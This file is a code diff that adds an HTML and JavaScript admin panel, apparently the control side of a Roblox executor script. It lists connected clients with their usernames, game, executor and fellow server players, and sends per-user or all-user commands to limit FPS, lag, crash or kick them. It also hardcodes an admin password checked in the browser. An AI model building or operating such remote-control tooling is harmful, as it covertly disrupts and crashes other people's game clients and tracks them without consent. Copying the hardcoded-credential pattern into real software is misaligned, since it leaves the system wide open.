@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>skid la skid 67</title>
+<style>
+:root{
+  --bg:#0a0d13; --panel:#121722; --panel-2:#171d2b; --line:#232b3d;
+  --txt:#e7ecf6; --muted:#8b95ab; --acc:#4f8cff; --ok:#2fbf71; --warn:#ffb020; --bad:#ff4d5e;
+}
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+body{margin:0;min-height:100vh;color:var(--txt);
+  background:radial-gradient(1200px 600px at 20% -10%,#152034 0%,var(--bg) 60%);
+  font:14px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+button{font:inherit;cursor:pointer}input{font:inherit}
+
+#login{min-height:100vh;display:grid;place-items:center;padding:24px}
+.login-box{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:28px;
+  width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.login-box h1{margin:0 0 4px;font-size:20px}
+.login-box p{margin:0 0 18px;color:var(--muted);font-size:13px}
+.login-box input{width:100%;padding:11px 13px;border-radius:10px;border:1px solid var(--line);
+  background:#0d121c;color:var(--txt);outline:none;margin-bottom:12px}
+.login-box input:focus{border-color:var(--acc)}
+.login-box button{width:100%;padding:11px;border:0;border-radius:10px;background:var(--acc);color:#fff;font-weight:600}
+.err{color:var(--bad);font-size:13px;min-height:18px;margin-bottom:6px}
+
+header{position:sticky;top:0;z-index:10;background:rgba(10,13,19,.85);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.hwrap{max-width:1400px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.brand{font-weight:700;letter-spacing:.3px}.brand span{color:var(--acc)}
+.stat{display:flex;gap:6px;align-items:center;color:var(--muted);font-size:13px}
+.pill{background:var(--panel-2);border:1px solid var(--line);border-radius:999px;padding:3px 10px;font-size:12px;color:var(--txt)}
+.spacer{flex:1}
+.search{padding:8px 12px;border-radius:10px;border:1px solid var(--line);background:#0d121c;color:var(--txt);outline:none;min-width:200px}
+.search:focus{border-color:var(--acc)}
+.ghost{background:transparent;border:1px solid var(--line);color:var(--muted);padding:8px 12px;border-radius:10px}
+.ghost:hover{color:var(--txt);border-color:#33405a}
+
+main{max-width:1400px;margin:0 auto;padding:20px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
+
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:18px;
+  display:flex;flex-direction:column;gap:14px;transition:border-color .15s}
+.card:hover{border-color:#2f3b53}
+.card.offline{opacity:.55}
+
+.hero{display:flex;flex-direction:column;align-items:center;gap:10px}
+.hero-wrap{position:relative}
+.hero-img{width:140px;height:140px;border-radius:20px;display:block;
+  object-fit:cover;background:#0d121c;
+  border:3px solid rgba(79,140,255,.7);
+  box-shadow:0 0 24px rgba(79,140,255,.55), 0 0 0 6px rgba(79,140,255,.1)}
+.hero-img.off{border-color:rgba(255,77,94,.5);
+  box-shadow:0 0 24px rgba(255,77,94,.35), 0 0 0 6px rgba(255,77,94,.08)}
+.online-badge{
+  position:absolute;bottom:-6px;left:50%;transform:translateX(-50%);
+  padding:3px 12px;border-radius:999px;font-size:10.5px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;border:2px solid var(--panel);
+}
+.online-badge.on{background:var(--ok);color:#08130c;box-shadow:0 0 12px rgba(47,191,113,.8)}
+.online-badge.off{background:var(--bad);color:#1a0507;box-shadow:0 0 12px rgba(255,77,94,.7)}
+.hero-name{font-weight:800;font-size:17px;text-align:center;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.hero-user{color:var(--muted);font-size:13px;text-align:center;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.hero-tags{display:flex;flex-wrap:wrap;gap:6px;justify-content:center}
+.tag{background:var(--panel-2);border:1px solid var(--line);border-radius:8px;
+  padding:3px 9px;font-size:11.5px;color:#c4cde0}
+.tag.exec{border-color:rgba(168,85,247,.5);color:#e0c8ff}
+.tag.game{border-color:rgba(79,140,255,.5);color:#c8ddff}
+
+.kv{display:grid;grid-template-columns:auto 1fr;gap:5px 10px;font-size:12.5px;
+  border-top:1px solid var(--line);padding-top:12px}
+.kv b{color:var(--muted);font-weight:500}
+.kv div{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+.cmds{display:flex;flex-wrap:wrap;gap:6px;border-top:1px solid var(--line);padding-top:11px}
+.cmds button{flex:1 1 auto;padding:8px 10px;border-radius:9px;border:1px solid var(--line);
+  background:var(--panel-2);color:var(--muted);font-size:12.5px;transition:.15s;white-space:nowrap}
+.cmds button:hover{color:var(--txt);border-color:#33405a}
+.cmds button.active{background:var(--acc);border-color:var(--acc);color:#fff;font-weight:600}
+.cmds button[data-field="crash"].active{background:var(--bad);border-color:var(--bad)}
+.cmds button[data-field="kick"].active{background:var(--warn);border-color:var(--warn);color:#151a24}
+
+.allbar{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:14px;color:var(--muted);font-size:12.5px}
+.allbar button{padding:6px 10px;border-radius:8px;border:1px solid var(--line);background:var(--panel);color:var(--muted);font-size:12.5px}
+.allbar button:hover{color:var(--txt);border-color:#33405a}
+
+.empty-state{grid-column:1/-1;text-align:center;padding:60px 20px;color:var(--muted);
+  border:1px dashed var(--line);border-radius:14px}
+.empty-state h3{color:var(--txt);margin:0 0 8px;font-size:16px}
+.empty-state p{margin:4px 0;font-size:13px}
+
+.toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%) translateY(80px);
+  background:#1a2130;border:1px solid var(--line);padding:10px 16px;border-radius:10px;
+  opacity:0;transition:.25s;pointer-events:none;z-index:50}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <div class="login-box">
+    <h1>skid la skid 67</h1>
+    <p>Enter the password to continue.</p>
+    <div class="err" id="loginErr"></div>
+    <input id="pw" type="password" placeholder="Password" autocomplete="off">
+    <button id="loginBtn" type="button">Sign in</button>
+  </div>
+</div>
+
+<div id="app" hidden>
+  <header>
+    <div class="hwrap">
+      <div class="brand">skid la skid <span>67</span></div>
+      <div class="stat">
+        <span class="pill" id="onlineCount">0 online</span>
+        <span class="pill" id="totalCount">0 total</span>
+      </div>
+      <div class="spacer"></div>
+      <input id="search" class="search" placeholder="Search user / game / executor…">
+      <button class="ghost" id="refresh" type="button">Refresh</button>
+      <button class="ghost" id="logout" type="button">Logout</button>
+    </div>
+  </header>
+
+  <main>
+    <div class="allbar">
+      <span>Turn ON for everyone:</span>
+      <button data-all="fps_limit" type="button">FPS Limit</button>
+      <button data-all="lag_n" type="button">Lag Normal</button>
+      <button data-all="lag_c" type="button">Lag Carry</button>
+      <button data-all="crash" type="button">Crash</button>
+      <button data-all="kick" type="button">Kick</button>
+      <button data-all="reset" type="button" style="color:var(--bad)">Reset all</button>
+    </div>
+    <div class="grid" id="grid"></div>
+  </main>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  "use strict";
+  const ADMIN_PASSWORD = "JohnPorkUncle";
+
+  const $ = s => document.querySelector(s);
+  const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+  function toast(msg){
+    const t = $('#toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._t);
+    t._t = setTimeout(() => t.classList.remove('show'), 1800);
+  }
+  function timeAgo(ms){
+    if(!ms) return '—';
+    const s = Math.max(0, Math.round((Date.now() - ms) / 1000));
+    if(s < 5) return 'just now';
+    if(s < 60) return s + 's ago';
+    if(s < 3600) return Math.floor(s/60) + 'm ago';
+    return Math.floor(s/3600) + 'h ago';
+  }
+  const headshot = id =>
+    "https://www.roblox.com/headshot-thumbnail/image?userId=" +
+    encodeURIComponent(id) + "&width=420&height=420&format=png";
+
+  let USERS = [], FILTER = '', timer = null;
+
+  function tryLogin(){
+    const pw = $('#pw').value;
+    if(pw === ADMIN_PASSWORD){
+      $('#loginErr').textContent = '';
+      $('#login').hidden = true;
+      $('#app').hidden = false;
+      load();
+      clearInterval(timer);
+      timer = setInterval(load, 2500);
+    } else {
+      $('#loginErr').textContent = 'Wrong password.';
+    }
+  }
+  function logout(){
+    clearInterval(timer);
+    $('#app').hidden = true;
+    $('#login').hidden = false;
+    $('#pw').value = '';
+    $('#loginErr').textContent = '';
+    $('#pw').focus();
+  }
+
+  async function load(){
+    try{
+      const res = await fetch('/api/admin/users', {
+        headers: { 'X-Admin-Key': ADMIN_PASSWORD }
+      });
+      if(!res.ok) return;
+      const data = await res.json();
+      USERS = Array.isArray(data.users) ? data.users : [];
+      render();
+    } catch(_){}
+  }
+
+  function cardHTML(u){
+    const c  = u.command || {};
+    const sp = Array.isArray(u.server_players) ? u.server_players : [];
+
+    const btn = (f, label) =>
+      '<button type="button" data-uid="' + esc(u.user_id) + '" data-field="' + f +
+      '" class="' + (c[f] ? 'active' : '') + '">' + label + '</button>';
+
+    return '<div class="card ' + (u.online ? '' : 'offline') + '">' +
+      '<div class="hero">' +
+        '<div class="hero-wrap">' +
+          '<img class="hero-img ' + (u.online ? '' : 'off') + '" src="' +
+            esc(headshot(u.user_id)) + '" alt="" ' +
+            'onerror="this.src=\'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png\'">' +
+          '<span class="online-badge ' + (u.online ? 'on' : 'off') + '">' +
+            (u.online ? 'Online' : 'Offline') + '</span>' +
+        '</div>' +
+        '<div class="hero-name">' + esc(u.display_name || u.username || 'Unknown') + '</div>' +
+        '<div class="hero-user">@' + esc(u.username || '?') + '</div>' +
+        '<div class="hero-tags">' +
+          '<span class="tag exec">' + esc(u.executor || 'unknown') + '</span>' +
+          '<span class="tag game">' + esc(u.game_name || 'Unknown game') + '</span>' +
+        '</div>' +
+      '</div>' +
+
+      '<div class="kv">' +
+        '<b>Place</b><div>' + esc(u.place_id == null ? '—' : u.place_id) + '</div>' +
+        '<b>Server</b><div>' + sp.length + ' player(s)' +
+          (sp.length ? ': ' + esc(sp.slice(0,6).join(', ')) : '') + '</div>' +
+        '<b>Seen</b><div>' + timeAgo(u.last_seen) + '</div>' +
+      '</div>' +
+
+      '<div class="cmds">' +
+        btn('fps_limit','FPS Limit') + btn('lag_n','Lag Normal') +
+        btn('lag_c','Lag Carry') + btn('crash','Crash') + btn('kick','Kick') +
+      '</div>' +
+    '</div>';
+  }
+
+  function render(){
+    const q = FILTER.trim().toLowerCase();
+    const list = q ? USERS.filter(u =>
+      (u.username||'').toLowerCase().includes(q) ||
+      (u.display_name||'').toLowerCase().includes(q) ||
+      (u.game_name||'').toLowerCase().includes(q) ||
+      (u.executor||'').toLowerCase().includes(q)
+    ) : USERS;
+
+    $('#onlineCount').textContent = USERS.filter(u => u.online).length + ' online';
+    $('#totalCount').textContent  = USERS.length + ' total';
+
+    const grid = $('#grid');
+    if(!USERS.length){
+      grid.innerHTML = '<div class="empty-state">' +
+        '<h3>No clients connected</h3>' +
+        '<p>Waiting for the executor script to heartbeat…</p></div>';
+      return;
+    }
+    if(!list.length){
+      grid.innerHTML = '<div class="empty-state"><h3>No matches</h3>' +
+        '<p>Try a different search.</p></div>';
+      return;
+    }
+    grid.innerHTML = list.map(cardHTML).join('');
+  }
+
+  function bind(){
+    $('#loginBtn').addEventListener('click', tryLogin);
+    $('#pw').addEventListener('keydown', e => {
+      if(e.key === 'Enter'){ e.preventDefault(); tryLogin(); }
+    });
+    $('#logout').addEventListener('click', logout);
+    $('#refresh').addEventListener('click', async () => { await load(); toast('Refreshed'); });
+    $('#search').addEventListener('input', e => { FILTER = e.target.value; render(); });
+
+    $('#grid').addEventListener('click', async e => {
+      const b = e.target.closest('button[data-field]');
+      if(!b) return;
+      const uid = b.getAttribute('data-uid');
+      const field = b.getAttribute('data-field');
+      const on = !b.classList.contains('active');
+      b.classList.toggle('active', on);
+      for(const u of USERS){
+        if(String(u.user_id) === String(uid)){
+          u.command = u.command || {};
+          u.command[field] = on;
+          break;
+        }
+      }
+      try{
+        const res = await fetch('/api/admin/command', {
+          method:'POST',
+          headers:{'Content-Type':'application/json','X-Admin-Key':ADMIN_PASSWORD},
+          body: JSON.stringify({ user_id: uid, field, value: on })
+        });
+        if(!res.ok) throw 0;
+        toast(field + ' → ' + (on ? 'ON' : 'OFF'));
+      } catch(_){
+        b.classList.toggle('active', !on);
+        toast('Failed to send command');
+      }
+    });
+
+    document.querySelector('.allbar').addEventListener('click', async e => {
+      const b = e.target.closest('button[data-all]');
+      if(!b) return;
+      const field = b.getAttribute('data-all');
+      const body = field === 'reset'
+        ? { field: 'reset', value: true }
+        : { field, value: true };
+      try{
+        const res = await fetch('/api/admin/command-all', {
+          method:'POST',
+          headers:{'Content-Type':'application/json','X-Admin-Key':ADMIN_PASSWORD},
+          body: JSON.stringify(body)
+        });
+        if(!res.ok) throw 0;
+        toast(field === 'reset' ? 'All commands reset' : field + ' → ON for everyone');
+        load();
+      } catch(_){ toast('Failed to send command'); }
+    });
+  }
+
+  function init(){ bind(); $('#pw').focus(); }
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
+})();
+</script>
+</body>
+</html>
